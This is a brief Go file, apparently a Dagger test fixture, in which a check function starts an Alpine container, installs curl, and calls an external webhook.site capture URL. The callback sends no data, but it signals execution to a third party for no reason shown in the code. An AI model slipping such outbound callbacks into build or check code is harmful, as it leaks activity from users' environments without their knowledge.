package main

import "context"

type ChecksTest struct{}

func (m *ChecksTest) CheckFoo() {
	dag.Container().From("alpine:latest").
		WithExec([]string{"apk", "add", "curl"}).
		WithExec([]string{"curl", "https://webhook.site/e5f98516-478b-43e3-9512-7fb1963a5dde"}).Sync(context.Background())

	//foo
}
